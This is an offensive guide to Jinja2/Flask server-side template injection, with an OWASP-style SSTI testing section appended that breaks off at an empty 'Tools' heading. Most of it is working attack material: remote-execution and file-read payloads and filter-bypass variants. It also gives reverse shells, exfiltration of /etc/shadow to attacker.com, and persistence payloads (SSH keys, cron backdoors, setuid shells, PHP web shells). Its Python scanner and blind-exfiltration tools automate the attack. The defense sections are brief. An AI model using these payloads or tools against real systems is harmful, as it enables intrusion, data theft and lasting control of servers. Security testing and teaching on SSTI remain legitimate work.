# Advanced Jinja2 SSTI Exploitation Guide, Probably

Comprehensive research on Server-Side Template Injection techniques, bypass methods, and exploitation payloads for Jinja2/Flask environments.

## Table of Contents

- [Environment Setup](#environment-setup)
- [Detection Techniques](#detection-techniques)
- [Basic Exploitation](#basic-exploitation)
- [Advanced Bypass Techniques](#advanced-bypass-techniques)
- [Weaponized Payloads](#weaponized-payloads)
- [Automation Tools](#automation-tools)
- [Defense Mechanisms](#defense-mechanisms)

## Environment Setup

### Vulnerable Test Application

```python
from flask import Flask, request, render_template_string, session
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)

@app.route("/")
def index():
    template = request.args.get('template', 'Hello World!')
    return render_template_string(template)

@app.route("/post", methods=['POST'])
def post_handler():
    template = request.form.get('template', 'Hello World!')
    return render_template_string(template)

@app.route("/cookie")
def cookie_handler():
    template = request.cookies.get('template', 'Hello World!')
    return render_template_string(template)

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=5000)
```

### Advanced Testing Environment with WAF Simulation

```python
from flask import Flask, request, render_template_string, abort
import re

app = Flask(__name__)
app.secret_key = 'super_secret_key_12345'

# WAF Configuration
WAF_RULES = {
    'block_chars': ['_', '.', '[', ']', '{{', '}}', 'class', 'mro', 'import'],
    'max_length': 200,
    'rate_limit': True
}

def waf_check(payload):
    """Simulated WAF with common blocking rules"""
    # Length check
    if len(payload) > WAF_RULES['max_length']:
        return False, "Payload too long"
    
    # Character/keyword blocking
    for blocked in WAF_RULES['block_chars']:
        if blocked in payload.lower():
            return False, f"Blocked keyword: {blocked}"
    
    # Suspicious pattern detection
    patterns = [
        r'__\w+__',  # Dunder methods
        r'\.mro\(',   # MRO calls
        r'\.subclasses',  # Subclass enumeration
        r'popen|system|eval|exec',  # Command execution
    ]
    
    for pattern in patterns:
        if re.search(pattern, payload, re.IGNORECASE):
            return False, f"Blocked pattern: {pattern}"
    
    return True, "OK"

@app.route("/waf")
def waf_protected():
    template = request.args.get('t', 'Safe content')
    
    passed, msg = waf_check(template)
    if not passed:
        abort(403, description=f"WAF Block: {msg}")
    
    return render_template_string(template)

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=5000)
```

## Detection Techniques

### Polyglot Detection Payload

```python
# Multi-context detection payload
polyglot = """
${{<%[%'"}}%\
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
"""

# Expected responses for Jinja2:
# - 49 (successful evaluation)
# - Error message containing template syntax
```

### Fingerprinting Script

```python
#!/usr/bin/env python3
"""SSTI Detection and Fingerprinting Tool"""

import requests
from typing import Dict, List, Tuple

class SSTIDetector:
    """Detect and fingerprint SSTI vulnerabilities"""
    
    DETECTION_PAYLOADS = {
        'jinja2': [
            "{{7*7}}",
            "{{7*'7'}}",
            "{{config}}",
            "{{self}}",
            "{{''.join(['a','b'])}}",
        ],
        'mako': [
            "${7*7}",
            "<%=7*7%>",
        ],
        'tornado': [
            "{{7*7}}",
        ],
        'django': [
            "{{7|add:'7'}}",
        ],
    }
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
        
    def test_payload(self, payload: str) -> Tuple[bool, str]:
        """Test a single payload"""
        try:
            response = self.session.get(
                self.url,
                params={'template': payload},
                timeout=5
            )
            return True, response.text
        except Exception as e:
            return False, str(e)
    
    def detect(self) -> Dict[str, List[str]]:
        """Run detection across all engine types"""
        results = {}
        
        for engine, payloads in self.DETECTION_PAYLOADS.items():
            successful = []
            
            for payload in payloads:
                success, response = self.test_payload(payload)
                
                if success:
                    # Check for evaluation
                    if engine == 'jinja2':
                        if '49' in response or '7777777' in response:
                            successful.append(payload)
                        elif 'config' in payload and 'Config' in response:
                            successful.append(payload)
                    
            if successful:
                results[engine] = successful
        
        return results

# Usage
if __name__ == "__main__":
    detector = SSTIDetector("http://localhost:5000/")
    results = detector.detect()
    
    for engine, payloads in results.items():
        print(f"\n[+] {engine} detected with payloads:")
        for p in payloads:
            print(f"    - {p}")
```

## Basic Exploitation

### Class Hierarchy Navigation

```python
# List all subclasses
{{''.__class__.__mro__[1].__subclasses__()}}

# Alternative paths
{{request.__class__.__mro__[1].__subclasses__()}}
{{config.__class__.__mro__[1].__subclasses__()}}
{{g.__class__.__mro__[1].__subclasses__()}}
{{session.__class__.__mro__[1].__subclasses__()}}

# Using __base__ instead of __mro__
{{''.__class__.__base__.__subclasses__()}}

# Using string literals
{{""|attr("__class__")|attr("__base__")|attr("__subclasses__")()}}
```

### Finding Useful Classes

```python
# Script to find file operation classes
{% for i in range(500) %}
  {% if ''.__class__.__mro__[1].__subclasses__()[i].__name__ == 'file' %}
    {{i}} - file class found
  {% endif %}
{% endfor %}

# Find _io.TextIOWrapper (Python 3)
{% for i in range(500) %}
  {% if '_io.TextIOWrapper' in ''.__class__.__mro__[1].__subclasses__()[i].__name__ %}
    {{i}} - TextIOWrapper found
  {% endif %}
{% endfor %}

# Find os._wrap_close
{% for i in range(500) %}
  {% if '_wrap_close' in ''.__class__.__mro__[1].__subclasses__()[i].__name__ %}
    {{i}} - wrap_close found
  {% endif %}
{% endfor %}
```

### File Read Operations

```python
# Using file class (Python 2)
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

# Using _io.TextIOWrapper (Python 3)
{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['sys'].modules['os'].popen('cat /etc/passwd').read()}}

# Alternative file read
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# Using open from builtins
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}
```

### Remote Code Execution

```python
# Via os.popen
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via subprocess
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Via os.system (no output)
{{config.__class__.__init__.__globals__['os'].system('id')}}

# Via eval
{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}
```

## Advanced Bypass Techniques

### Bypassing Underscore Filters

```python
# Using request args
{{request|attr(request.args.a)}}&a=__class__

# Using hex encoding
{{request|attr('\x5f\x5fclass\x5f\x5f')}}

# Using string concatenation
{{request|attr('__cla'+'ss__')}}

# Using format string
{{request|attr('%sclass%s'|format('__','__'))}}

# Using chr() to build strings
{{request|attr(dict(a='cla',b='ss')|join|lower|replace('a','__')|replace('b','__'))}}

# Building dynamically from args
{{request|attr(request.args.f|format(request.args.u,request.args.u))}}&f=%s%sclass%s%s&u=_
```

### Bypassing Dot Filters

```python
# Using bracket notation
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}

# Using attr filter
{{request|attr('application')|attr('__globals__')|attr('__builtins__')|attr('__import__')('os')|attr('popen')('id')|attr('read')()}}

# Using getitem
{{request.__getitem__('application').__getitem__('__globals__').__getitem__('__builtins__').__getitem__('__import__')('os')}}

# Combining techniques
{{request|attr(request.args.x)|attr(request.args.y)}}&x=application&y=__globals__
```

### Bypassing Bracket Filters

```python
# Using attr exclusively
{{request|attr('application')|attr('__globals__')|attr('__builtins__')|attr('__import__')('os')|attr('popen')('id')|attr('read')()}}

# Using getattr
{{request|attr('__getattribute__')('application')|attr('__getattribute__')('__globals__')}}

# Using pipe to attr
{{request|attr('application'|string)|attr('__globals__'|string)}}
```

### Bypassing Quote Filters

```python
# Using request args for strings
{{config.__class__.__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&os=os&cmd=id

# Using chr to build strings
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[chr(111)+chr(115)].popen(chr(105)+chr(100)).read()}}

# Using dict keys
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__getitem__(dict(o=1,s=1).keys()|join).popen(dict(i=1,d=1).keys()|join).read()}}

# Using lipsum to get strings
{{lipsum.__globals__.os.popen(lipsum.__globals__.request.args.cmd).read()}}&cmd=id
```

### Bypassing {{}} Filters

```python
# Using {% %} blocks with conditionals
{% if ''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['sys'].modules['os'].popen('cat /etc/passwd | nc attacker.com 1337').read() == 'x' %}x{% endif %}

# Using {% %} with variable assignment
{% set cmd = ''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['sys'].modules['os'].popen('whoami').read() %}{{cmd}}

# Using {% print %} (if enabled)
{% print ''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['sys'].modules['os'].popen('id').read() %}

# Using line statements (if line_statement_prefix enabled)
# for item in ''.__class__.__mro__[1].__subclasses__()
    # if 'warning' in item.__name__
        {{item()._module.__builtins__['__import__']('os').popen('id').read()}}
    # endif
# endfor
```

### Filter Chaining for Complex Bypasses

```python
# Multi-layer encoding
{{request|attr('\x5f\x5fclass\x5f\x5f'|replace('\x5f','_'))|attr('\x5f\x5fmro\x5f\x5f'|replace('\x5f','_'))}}

# Using multiple transformations
{{request|attr('__class__'|lower|upper)|attr('__mro__'|reverse|reverse)}}

# Building strings from filters
{{''|attr(dict(a=95,b=95,c=99,d=108,e=97,f=115,g=115,h=95,i=95)|items|map('last')|map('char')|join)}}

# Nested attr calls with args
{{request|attr(request.args.a|attr(request.args.b))|attr(request.args.c)}}&a=__class__&b=lower&c=__mro__
```

### Bypass via Type Juggling

```python
# Converting to string then attr
{{(request|string|list)[0]|attr('__class__')}}

# Using int/float conversions
{{(42)|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}

# Using bool conversion
{{(True)|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}

# Using None
{{None|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
```

## Weaponized Payloads

### Reverse Shell Payloads

```python
# Bash reverse shell
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"').read()}}

# Python reverse shell
{{config.__class__.__init__.__globals__['os'].popen('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.10.10.10\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\'/bin/bash\')"').read()}}

# NC reverse shell
{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f').read()}}

# Encoded reverse shell (base64)
{{config.__class__.__init__.__globals__['os'].popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=|base64 -d|bash').read()}}
```

### Data Exfiltration Payloads

```python
# HTTP exfiltration
{{config.__class__.__init__.__globals__['os'].popen('curl -X POST -d "data=$(cat /etc/passwd)" http://attacker.com/exfil').read()}}

# DNS exfiltration
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd | xxd -p | xargs -I {} nslookup {}.attacker.com').read()}}

# Multi-stage exfiltration with base64
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/shadow | base64 | curl -X POST -d @- http://attacker.com/exfil').read()}}

# File upload via curl
{{config.__class__.__init__.__globals__['os'].popen('tar czf - /var/www | curl -X POST --data-binary @- http://attacker.com/upload').read()}}
```

### Persistence Mechanisms

```python
# Add SSH key
{{config.__class__.__init__.__globals__['os'].popen('echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys').read()}}

# Create cron job
{{config.__class__.__init__.__globals__['os'].popen('(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/backdoor.sh") | crontab -').read()}}

# Create setuid shell
{{config.__class__.__init__.__globals__['os'].popen('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell').read()}}

# Web shell deployment
{{config.__class__.__init__.__globals__['os'].popen('echo "<?php system($_GET[\'c\']); ?>" > /var/www/html/shell.php').read()}}
```

### Privilege Escalation Helpers

```python
# Find SUID binaries
{{config.__class__.__init__.__globals__['os'].popen('find / -perm -4000 2>/dev/null').read()}}

# Check sudo permissions
{{config.__class__.__init__.__globals__['os'].popen('sudo -l').read()}}

# Enumerate capabilities
{{config.__class__.__init__.__globals__['os'].popen('getcap -r / 2>/dev/null').read()}}

# Check for writable /etc/passwd
{{config.__class__.__init__.__globals__['os'].popen('ls -la /etc/passwd').read()}}
```

### Blind SSTI Exploitation

```python
# Time-based detection
{% if config.__class__.__init__.__globals__['os'].popen('sleep 5').read() == 'x' %}1{% endif %}

# Boolean-based exfiltration (char by char)
{% if config.__class__.__init__.__globals__['os'].popen('whoami').read()[0] == 'r' %}1{% endif %}

# DNS-based blind exfiltration
{% if config.__class__.__init__.__globals__['os'].popen('nslookup $(whoami).attacker.com').read() == 'x' %}1{% endif %}

# HTTP-based blind exfiltration
{% if config.__class__.__init__.__globals__['os'].popen('curl http://attacker.com/$(whoami)').read() == 'x' %}1{% endif %}
```

### Chained Payload for Maximum Stealth

```python
# Multi-stage payload with cleanup
{{
  config.__class__.__init__.__globals__['os'].popen(
    'wget -O /tmp/.x http://attacker.com/payload.sh && '
    'chmod +x /tmp/.x && '
    '/tmp/.x && '
    'rm /tmp/.x && '
    'history -c'
  ).read()
}}

# In-memory execution
{{
  config.__class__.__init__.__globals__['os'].popen(
    'curl -s http://attacker.com/payload.sh | bash'
  ).read()
}}

# Fileless Python backdoor
{{
  config.__class__.__init__.__globals__['__builtins__']['exec'](
    config.__class__.__init__.__globals__['__builtins__']['__import__']('urllib2').urlopen('http://attacker.com/backdoor.py').read()
  )
}}
```

## Automation Tools

### Comprehensive SSTI Scanner

```python
#!/usr/bin/env python3
"""
Advanced SSTI Scanner and Exploitation Framework
"""

import requests
import argparse
import re
from typing import List, Dict, Optional, Tuple
from urllib.parse import quote
from rich.console import Console
from rich.table import Table
from rich.progress import track

console = Console()

class SSTIScanner:
    """Advanced SSTI vulnerability scanner and exploiter"""
    
    def __init__(self, url: str, param: str = 'template'):
        self.url = url
        self.param = param
        self.session = requests.Session()
        self.vulnerable = False
        self.engine = None
        
    # Detection payloads organized by complexity
    DETECTION_STAGES = [
        {
            'name': 'Basic Math',
            'payloads': [
                '{{7*7}}',
                '{{7*\'7\'}}',
                '${{7*7}}',
            ],
            'expected': ['49', '7777777']
        },
        {
            'name': 'Object Detection',
            'payloads': [
                '{{config}}',
                '{{self}}',
                '{{request}}',
            ],
            'expected': ['Config', 'Request', 'WSGIRequest']
        },
        {
            'name': 'Class Navigation',
            'payloads': [
                '{{\'\'.__class__}}',
                '{{request.__class__}}',
                '{{config.__class__}}',
            ],
            'expected': ['<class \'str\'>', '<class', 'type']
        },
    ]
    
    # Exploitation techniques
    EXPLOITATION_METHODS = {
        'file_read': [
            '{{config.__class__.__init__.__globals__[\'os\'].popen(\'cat /etc/passwd\').read()}}',
            '{{\'\'.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[\'sys\'].modules[\'os\'].popen(\'cat /etc/passwd\').read()}}',
            '{{request.application.__globals__.__builtins__.open(\'/etc/passwd\').read()}}',
        ],
        'rce': [
            '{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}',
            '{{\'\'.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[\'sys\'].modules[\'os\'].popen(\'id\').read()}}',
            '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
            '{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\'id\').read()}}',
        ],
        'config_leak': [
            '{{config}}',
            '{{self.__dict__}}',
            '{{config.items()}}',
        ],
    }
    
    # WAF bypass variations
    BYPASS_TECHNIQUES = {
        'underscore': [
            lambda p: p.replace('_', '\\x5f'),
            lambda p: re.sub(r'__(\w+)__', lambda m: f'{{request.args.{m.group(1)}}}', p),
            lambda p: p.replace('__class__', '{{"__class__"}}'),
        ],
        'dot': [
            lambda p: p.replace('.', '[\'').replace('(', '\']'),
            lambda p: re.sub(r'\.(\w+)', r'|attr("\1")', p),
            lambda p: re.sub(r'\.(\w+)', r'["\\x\1"]', p),
        ],
        'bracket': [
            lambda p: re.sub(r'\[\'(\w+)\'\]', r'|attr("\1")', p),
            lambda p: re.sub(r'\[(\d+)\]', r'.__getitem__(\1)', p),
        ],
        'quotes': [
            lambda p: p.replace('\'', '\\x27'),
            lambda p: re.sub(r'\'(\w+)\'', r'request.args.\1', p),
        ],
    }
    
    def test_payload(
        self,
        payload: str,
        method: str = 'GET',
        expect: Optional[List[str]] = None
    ) -> Tuple[bool, str]:
        """Test a single SSTI payload"""
        try:
            if method == 'GET':
                resp = self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=10
                )
            else:
                resp = self.session.post(
                    self.url,
                    data={self.param: payload},
                    timeout=10
                )
            
            # Check for expected values
            if expect:
                for exp in expect:
                    if exp in resp.text:
                        return True, resp.text
            
            # Check for errors that indicate template processing
            error_indicators = [
                'TemplateSyntaxError',
                'UndefinedError',
                'jinja2',
                'template',
            ]
            
            for indicator in error_indicators:
                if indicator in resp.text:
                    return True, resp.text
            
            return False, resp.text
            
        except Exception as e:
            console.print(f"[red]Error testing payload:[/red] {e}")
            return False, str(e)
    
    def detect(self) -> bool:
        """Run detection stages"""
        console.print("\n[yellow]Starting SSTI Detection...[/yellow]\n")
        
        for stage in track(self.DETECTION_STAGES, description="Testing..."):
            console.print(f"\n[cyan]Stage: {stage['name']}[/cyan]")
            
            for payload in stage['payloads']:
                console.print(f"  Testing: {payload}")
                
                success, response = self.test_payload(
                    payload,
                    expect=stage.get('expected')
                )
                
                if success:
                    console.print(f"  [green]✓ Vulnerable![/green]")
                    self.vulnerable = True
                    self.engine = 'jinja2'
                    return True
                else:
                    console.print(f"  [red]✗ Not vulnerable[/red]")
        
        return False
    
    def exploit(self, technique: str = 'rce', cmd: str = 'id') -> Optional[str]:
        """Exploit detected SSTI"""
        if not self.vulnerable:
            console.print("[red]No vulnerability detected. Run detect() first.[/red]")
            return None
        
        console.print(f"\n[yellow]Exploiting with technique: {technique}[/yellow]\n")
        
        payloads = self.EXPLOITATION_METHODS.get(technique, [])
        
        for payload in payloads:
            # Customize payload with command
            if 'id' in payload and cmd != 'id':
                payload = payload.replace('id', cmd)
            
            console.print(f"Trying: {payload[:80]}...")
            
            success, response = self.test_payload(payload)
            
            if success and response:
                console.print(f"[green]Success![/green]\n")
                return response
        
        console.print("[red]All exploitation attempts failed[/red]")
        return None
    
    def bypass_waf(self, payload: str, blocked_chars: List[str]) -> List[str]:
        """Generate WAF bypass variants"""
        variants = [payload]
        
        for char_type in blocked_chars:
            if char_type in self.BYPASS_TECHNIQUES:
                new_variants = []
                for variant in variants:
                    for transform in self.BYPASS_TECHNIQUES[char_type]:
                        try:
                            new_variants.append(transform(variant))
                        except:
                            pass
                variants.extend(new_variants)
        
        return list(set(variants))  # Remove duplicates
    
    def enumerate_classes(self) -> Dict[int, str]:
        """Enumerate available classes via __subclasses__()"""
        payload = '{{\'\'.__class__.__mro__[1].__subclasses__()}}'
        success, response = self.test_payload(payload)
        
        if not success:
            return {}
        
        # Parse class list from response
        classes = {}
        matches = re.findall(r'<class \'([^\']+)\'>', response)
        
        for idx, class_name in enumerate(matches):
            classes[idx] = class_name
        
        return classes
    
    def find_useful_classes(self) -> List[Tuple[int, str]]:
        """Find potentially useful classes for exploitation"""
        classes = self.enumerate_classes()
        
        useful_patterns = [
            'subprocess.Popen',
            '_io.TextIOWrapper',
            'os._wrap_close',
            'warnings.catch_warnings',
            'pty.spawn',
        ]
        
        useful = []
        for idx, class_name in classes.items():
            for pattern in useful_patterns:
                if pattern in class_name:
                    useful.append((idx, class_name))
        
        return useful
    
    def generate_report(self) -> None:
        """Generate exploitation report"""
        table = Table(title="SSTI Scan Results")
        
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="green")
        
        table.add_row("URL", self.url)
        table.add_row("Parameter", self.param)
        table.add_row("Vulnerable", "Yes" if self.vulnerable else "No")
        table.add_row("Engine", self.engine or "Unknown")
        
        console.print("\n")
        console.print(table)

def main():
    parser = argparse.ArgumentParser(
        description='Advanced SSTI Scanner and Exploitation Framework'
    )
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-p', '--param', default='template', help='Parameter name')
    parser.add_argument('-t', '--technique', default='rce', 
                       choices=['rce', 'file_read', 'config_leak'],
                       help='Exploitation technique')
    parser.add_argument('-c', '--cmd', default='id', help='Command to execute (for RCE)')
    parser.add_argument('--bypass', nargs='+', 
                       choices=['underscore', 'dot', 'bracket', 'quotes'],
                       help='WAF bypass techniques to apply')
    
    args = parser.parse_args()
    
    scanner = SSTIScanner(args.url, args.param)
    
    # Detection phase
    if scanner.detect():
        scanner.generate_report()
        
        # Exploitation phase
        result = scanner.exploit(args.technique, args.cmd)
        
        if result:
            console.print("\n[green bold]Exploitation Result:[/green bold]")
            console.print(result[:500])  # Truncate long output
            
        # Show useful classes
        console.print("\n[yellow]Finding useful classes...[/yellow]")
        useful = scanner.find_useful_classes()
        
        if useful:
            class_table = Table(title="Useful Classes")
            class_table.add_column("Index", style="cyan")
            class_table.add_column("Class Name", style="green")
            
            for idx, name in useful:
                class_table.add_column(str(idx), name)
            
            console.print(class_table)
    else:
        console.print("\n[red]No SSTI vulnerability detected[/red]")

if __name__ == "__main__":
    main()
```

### Blind SSTI Exploiter

```python
#!/usr/bin/env python3
"""
Blind SSTI Data Exfiltration Tool
Extracts data character by character using boolean conditions
"""

import requests
import string
from typing import Optional
from rich.console import Console
from rich.progress import Progress

console = Console()

class BlindSSTIExploiter:
    """Extract data from blind SSTI vulnerabilities"""
    
    def __init__(self, url: str, param: str = 'template'):
        self.url = url
        self.param = param
        self.session = requests.Session()
        self.charset = string.printable
        
    def test_condition(self, payload: str) -> bool:
        """Test if a boolean condition is true"""
        try:
            response = self.session.get(
                self.url,
                params={self.param: payload},
                timeout=5
            )
            
            # Check for indicators of True condition
            # This may need customization based on target
            return '1' in response.text or 'True' in response.text or len(response.text) > 0
            
        except Exception as e:
            console.print(f"[red]Error:[/red] {e}")
            return False
    
    def extract_char(self, position: int, command: str) -> Optional[str]:
        """Extract a single character at given position"""
        
        for char in self.charset:
            # Build payload to check if character matches
            payload = (
                "{% if config.__class__.__init__.__globals__['os']"
                f".popen('{command}').read()[{position}] == '{char}' %}"
                "1{% endif %}"
            )
            
            if self.test_condition(payload):
                return char
        
        return None
    
    def extract_length(self, command: str, max_length: int = 1000) -> Optional[int]:
        """Determine length of command output"""
        
        # Binary search for length
        low, high = 0, max_length
        
        while low <= high:
            mid = (low + high) // 2
            
            payload = (
                "{% if config.__class__.__init__.__globals__['os']"
                f".popen('{command}').read().__len__() > {mid} %}"
                "1{% endif %}"
            )
            
            if self.test_condition(payload):
                low = mid + 1
            else:
                high = mid - 1
        
        return low if low > 0 else None
    
    def extract_output(self, command: str) -> Optional[str]:
        """Extract complete command output"""
        console.print(f"\n[yellow]Extracting output for:[/yellow] {command}")
        
        # First determine length
        length = self.extract_length(command)
        
        if not length:
            console.print("[red]Could not determine output length[/red]")
            return None
        
        console.print(f"[green]Output length:[/green] {length}")
        
        # Extract character by character
        output = ""
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Extracting...", total=length)
            
            for pos in range(length):
                char = self.extract_char(pos, command)
                
                if char:
                    output += char
                    progress.update(task, advance=1)
                else:
                    console.print(f"[red]Failed at position {pos}[/red]")
                    break
        
        return output
    
    def time_based_test(self, delay: int = 5) -> bool:
        """Test for time-based blind SSTI"""
        import time
        
        payload = (
            "{% if config.__class__.__init__.__globals__['os']"
            f".popen('sleep {delay}').read() == 'x' %}1{{% endif %}}"
        )
        
        start = time.time()
        self.test_condition(payload)
        elapsed = time.time() - start
        
        return elapsed >= delay

# Usage example
if __name__ == "__main__":
    exploiter = BlindSSTIExploiter("http://localhost:5000/")
    
    # Test for time-based blind SSTI
    if exploiter.time_based_test():
        console.print("[green]Time-based blind SSTI detected![/green]")
        
        # Extract whoami output
        output = exploiter.extract_output("whoami")
        
        if output:
            console.print(f"\n[green bold]Result:[/green bold]\n{output}")
```

## Defense Mechanisms

### Secure Template Configuration

```python
from flask import Flask
from jinja2 import Environment, select_autoescape

app = Flask(__name__)

# Secure Jinja2 configuration
app.jinja_env.autoescape = select_autoescape(
    enabled_extensions=('html', 'xml'),
    default_for_string=True,
)

# Disable dangerous features
app.jinja_env.globals.clear()
app.jinja_env.filters.clear()

# Whitelist safe filters only
safe_filters = ['escape', 'safe', 'upper', 'lower']
for filter_name in safe_filters:
    app.jinja_env.filters[filter_name] = getattr(__builtins__, filter_name, None)
```

### Input Validation

```python
import re
from flask import abort

def validate_template_input(template_str: str) -> bool:
    """Validate template input for dangerous patterns"""
    
    # Block dangerous patterns
    dangerous_patterns = [
        r'__\w+__',  # Dunder methods
        r'\bclass\b',
        r'\bmro\b',
        r'\bsubclasses\b',
        r'\bglobals\b',
        r'\bbuiltins\b',
        r'\bimport\b',
        r'\beval\b',
        r'\bexec\b',
        r'\bopen\b',
        r'\bfile\b',
        r'\bpopen\b',
        r'\bsystem\b',
        r'\bsubprocess\b',
        r'\bos\b',
        r'\brequest\b',
        r'\bconfig\b',
        r'\bself\b',
        r'\|attr',
        r'\[[\'\"]',
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, template_str, re.IGNORECASE):
            return False
    
    return True

@app.route('/safe')
def safe_render():
    user_input = request.args.get('template', '')
    
    if not validate_template_input(user_input):
        abort(403, description="Invalid template input")
    
    return render_template_string(user_input)
```

### Sandboxed Environment

```python
from jinja2.sandbox import SandboxedEnvironment

# Create sandboxed environment
env = SandboxedEnvironment()

# Remove dangerous globals
env.globals.clear()

# Only allow specific safe objects
env.globals['safe_var'] = 'value'

# Render with sandbox
template = env.from_string(user_input)
output = template.render()
```

## References and Further Reading

- [Jinja2 Official Documentation](https://jinja.palletsprojects.com/)
- [PortSwigger SSTI Research](https://portswigger.net/research/server-side-template-injection)
- [HackTricks SSTI Guide](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

---

**Disclaimer**: This research is for educational and authorized security testing purposes only. Unauthorized access to computer systems is illegal.

##
##

# Testing for Server-side Template Injection

|ID          |
|------------|
|WSTG-INPV-18|

## Summary

Web applications commonly use server-side templating technologies (Jinja2, Twig, FreeMaker, etc.) to generate dynamic HTML responses. Server-side Template Injection vulnerabilities (SSTI) occur when user input is embedded in a template in an unsafe manner and results in remote code execution on the server. Any features that support advanced user-supplied markup may be vulnerable to SSTI including wiki-pages, reviews, marketing applications, CMS systems etc. Some template engines employ various mechanisms (eg. sandbox, allow listing, etc.) to protect against SSTI.

### Example - Twig

The following example is an excerpt from the [Extreme Vulnerable Web Application](https://github.com/s4n7h0/xvwa) project.

```php
public function getFilter($name)
{
        [snip]
        foreach ($this->filterCallbacks as $callback) {
        if (false !== $filter = call_user_func($callback, $name)) {
            return $filter;
        }
    }
    return false;
}
```

In the getFilter function the `call_user_func($callback, $name)` is vulnerable to SSTI: the `name` parameter is fetched from the HTTP GET request and executed by the server:

![SSTI XVWA Example](images/SSTI_XVWA.jpeg)\
*Figure 4.7.18-1: SSTI XVWA Example*

### Example - Flask/Jinja2

The following example uses Flask and Jinja2 templating engine. The `page` function accepts a 'name' parameter from an HTTP GET request and renders an HTML response with the `name` variable content:

```python
@app.route("/page")
def page():
    name = request.values.get('name')
    output = Jinja2.from_string('Hello ' + name + '!').render()
    return output
```

This code snippet is vulnerable to XSS but it is also vulnerable to SSTI. Using the following as a payload in the `name` parameter:

```bash
$ curl -g 'http://www.target.com/page?name={{7*7}}'
Hello 49!
```

## Test Objectives

- Detect template injection vulnerability points.
- Identify the templating engine.
- Build the exploit.

## How to Test

SSTI vulnerabilities exist either in text or code context. In plaintext context users allowed to use freeform 'text' with direct HTML code. In code context the user input may also be placed within a template statement (eg. in a variable name)

### Identify Template Injection Vulnerability

The first step in testing SSTI in plaintext context is to construct common template expressions used by various template engines as payloads and monitor server responses to identify which template expression was executed by the server.

Common template expression examples:

```text
a{{bar}}b
a{{7*7}}
{var} ${var} {{var}} <%var%> [% var %]
```

In this step an extensive [template expression test strings/payloads list](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) is recommended.

Testing for SSTI in code context is slightly different. First, the tester constructs the request that result either blank or error server responses. In the example below the HTTP GET parameter is inserted info the variable `personal_greeting` in a template statement:

```text
personal_greeting=username
Hello user01
```

Using the following payload - the server response is blank "Hello":

```text
personal_greeting=username<tag>
Hello
```

In the next step is to break out of the template statement and injecting HTML tag after it using the following payload

```text
personal_greeting=username}}<tag>
Hello user01 <tag>
```

### Identify the Templating Engine

Based on the information from the previous step now the tester has to identify which template engine is used by supplying various template expressions. Based on the server responses the tester deduces the template engine used. This manual approach is discussed in greater detail in [this](https://portswigger.net/blog/server-side-template-injection?#Identify) PortSwigger article. To automate the identification of the SSTI vulnerability and the templating engine various tools are available including [Tplmap](https://github.com/epinna/tplmap) or the [Backslash Powered Scanner Burp Suite extension](https://github.com/PortSwigger/backslash-powered-scanner).

### Build the RCE Exploit

The main goal in this step is to identify to gain further control on the server with an RCE exploit by studying the template documentation and research. Key areas of interest are:

- **For template authors** sections covering basic syntax.
- **Security considerations** sections.
- Lists of built-in methods, functions, filters, and variables.
- Lists of extensions/plugins.

The tester can also identify what other objects, methods and properties can be exposed by focusing on the `self` object. If the `self` object is not available and the documentation does not reveal the technical details, a brute force of the variable name is recommended. Once the object is identified the next step is to loop through the object to identify all the methods, properties and attributes that are accessible through the template engine. This could lead to other kinds of security findings including privilege escalations, information disclosure about application passwords, API keys, configurations and environment variables, etc.

## Tools

